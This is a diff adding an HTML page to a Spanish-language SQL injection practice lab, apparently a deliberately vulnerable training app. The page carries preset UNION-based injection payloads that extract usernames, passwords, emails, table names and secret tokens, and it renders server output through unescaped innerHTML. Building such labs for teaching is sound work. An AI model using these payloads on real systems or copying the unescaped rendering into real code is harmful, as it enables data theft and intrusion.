@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Noticias — SQLi Lab</title>
+  <link rel="stylesheet" href="/style.css"/>
+</head>
+<body>
+<nav>
+  <a href="/" class="logo">🔓 SQLi Lab</a>
+  <a href="/pagina/login">Login</a>
+  <a href="/pagina/noticias" class="active">Noticias</a>
+  <a href="/pagina/productos">Productos</a>
+  <a href="/pagina/buscar">Buscar</a>
+  <a href="/pagina/perfil">Perfil</a>
+  <span class="badge-vuln">⚠ Entorno Vulnerable</span>
+</nav>
+
+<div class="container">
+  <div class="page-header">
+    <h1>📰 Noticias</h1>
+    <p>Vulnerabilidad: <strong style="color:#ff6b6b">UNION-based SQL Injection</strong> — parámetro <code>id</code></p>
+  </div>
+
+  <div class="form-card" style="max-width:100%; margin:0 0 2rem;">
+    <div style="display:flex; gap:.75rem; flex-wrap:wrap; margin-bottom:1rem;">
+      <label style="font-size:.85rem;color:var(--muted);align-self:center;">ID de noticia:</label>
+      <input type="text" id="noticiasId" value="1" style="flex:1;min-width:200px;background:var(--bg3);border:1px solid var(--border);color:var(--text);padding:.6rem 1rem;border-radius:8px;font-size:.95rem;font-family:inherit;outline:none;"/>
+      <button onclick="cargarNoticia()" style="background:var(--accent);color:white;border:none;padding:.6rem 1.2rem;border-radius:8px;font-weight:600;cursor:pointer;font-family:inherit;">Buscar</button>
+    </div>
+    <div style="display:flex;gap:.5rem;flex-wrap:wrap;">
+      <button onclick="setPayload('1')" class="chip" style="cursor:pointer;border:none;background:var(--bg3);">Normal: 1</button>
+      <button onclick="setPayload('-1 UNION SELECT 1,username,password,email,5,6 FROM usuarios --')" class="chip" style="cursor:pointer;border:none;background:rgba(230,57,70,.15);color:var(--accent2);">UNION: extraer usuarios</button>
+      <button onclick="setPayload(\`-1 UNION SELECT 1,table_name,3,4,5,6 FROM information_schema.tables WHERE table_schema='practica' --\`)" class="chip" style="cursor:pointer;border:none;background:rgba(230,57,70,.15);color:var(--accent2);">UNION: listar tablas</button>
+      <button onclick="setPayload('-1 UNION SELECT 1,token_secreto,3,4,5,6 FROM perfiles --')" class="chip" style="cursor:pointer;border:none;background:rgba(230,57,70,.15);color:var(--accent2);">UNION: tokens secretos</button>
+    </div>
+  </div>
+
+  <div id="resultado"></div>
+</div>
+
+<script>
+function setPayload(val) {
+  document.getElementById('noticiasId').value = val;
+  cargarNoticia();
+}
+
+async function cargarNoticia() {
+  const id = document.getElementById('noticiasId').value;
+  const res = await fetch('/noticias?id=' + encodeURIComponent(id));
+  const data = await res.json();
+  const div = document.getElementById('resultado');
+
+  if (data.data && data.data.length > 0) {
+    let rows = data.data.map(r => `
+      <tr>
+        <td>${r.id ?? ''}</td>
+        <td>${r.titulo ?? ''}</td>
+        <td style="max-width:300px;word-break:break-word">${r.contenido ?? ''}</td>
+        <td>${r.autor_id ?? ''}</td>
+        <td>${r.publicado ?? ''}</td>
+        <td>${r.fecha ?? ''}</td>
+      </tr>`).join('');
+    div.innerHTML = `
+      <div class="table-wrap">
+        <table>
+          <thead><tr><th>ID</th><th>Título</th><th>Contenido</th><th>Autor</th><th>Pub.</th><th>Fecha</th></tr></thead>
+          <tbody>${rows}</tbody>
+        </table>
+      </div>
+      <div class="result-box" style="margin-top:1rem;">
+        <div class="result-header">SQL ejecutado</div>
+        <pre>${data.sql_ejecutado}</pre>
+      </div>`;
+  } else {
+    div.innerHTML = `
+      <div class="result-box error">
+        <div class="result-header">Resultado</div>
+        <pre>${JSON.stringify(data, null, 2)}</pre>
+      </div>`;
+  }
+}
+
+cargarNoticia();
+</script>
+</body>
+</html>
